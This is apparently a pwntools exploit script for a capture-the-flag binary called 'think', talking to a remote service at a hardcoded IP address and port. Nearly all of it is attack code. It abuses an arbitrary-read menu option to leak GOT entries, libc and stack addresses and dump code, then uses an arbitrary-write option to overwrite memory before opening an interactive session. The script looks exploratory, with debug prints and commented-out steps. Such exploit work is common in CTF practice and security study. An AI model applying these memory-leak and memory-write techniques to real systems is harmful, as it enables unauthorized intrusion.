from pwn import *

e = ELF("./think")

context.binary = e.path

p = remote("138.68.67.161", 20004)

def leak(addr):
  p.sendlineafter(">", "1")
  p.sendlineafter("Where:", str(addr))
  
  p.recvuntil("[ \n")
  
  return u64(p.recv(8))

def leak_code(offset):
  code = ""
  for i in range(4):
    p = remote("138.68.67.161", 20004)
    def leak(addr):
      p.sendlineafter(">", "1")
      p.sendlineafter("Where:", str(addr))
      
      p.recvuntil("[ \n")
      
      return u64(p.recv(8))
    
    base = leak(e.got["stdin"]) + offset

    for j in range(0x40):
      fun = leak(base + (0x40 * i + j) * 8)
      code += p64(fun)

    print(i)

  print(disasm(code))

def d(i):
  print("{:#x}".format(i))

def write(addr, val):
  p.sendlineafter(">", "2")
  p.sendlineafter("Where:", str(addr))
  p.sendlineafter("What:", str(val))


err = 0x205d315b200a5d20

base = leak(e.got["__libc_start_main"])
env = leak(base + 0x37898b + 0xd6 + 7)
stk = leak(env)

d(stk)

base = leak(e.got["stdin"])

d(base)

jmps = leak(leak(e.got["stdout"]) - 8)
fun = leak(jmps + 3 * 8)

# leak_code(fun - base)
d(leak(base))
write(base + 0x20, 0x2349123)

d(leak(base))

p.interactive()
